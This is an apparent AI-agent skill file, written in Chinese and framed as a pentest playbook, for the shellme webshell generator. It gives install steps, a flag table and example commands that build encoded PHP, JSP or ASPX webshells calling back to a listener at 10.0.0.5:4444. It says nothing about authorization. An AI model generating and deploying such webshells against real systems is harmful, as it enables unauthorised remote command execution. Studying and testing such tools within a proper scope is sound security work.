---
name: shellme-webshell
description: 渗透工具 skill:shellme 的安装、参数速查与攻击场景 playbook。当任务涉及 远程命令执行与WebShell 需要调用 shellme 时使用。
when-to-use: 渗透工具 skill:shellme 的安装、参数速查与攻击场景 playbook。当任务涉及 远程命令执行与WebShell 需要调用 shellme 时使用。
---

# shellme

- 攻击大类:C13 远程命令执行与WebShell
- 上游仓库:https://github.com/hatRiot/shellme
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/hatRiot/shellme
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 shellme.py -l 10.0.0.5 -p 4444 -o shell.php` | WebShell 生成 |
| `-o shell.jsp -p 443` | JSP |
| `-e` | 编码 |

## 攻击场景 Playbook

### 多语言 WebShell 生成

```bash
python3 shellme.py -l 10.0.0.5 -p 4444 -o cmd.aspx
# 选语言+编码
```

## 注意事项

多语言 WebShell 生成器,hatRiot 出品。
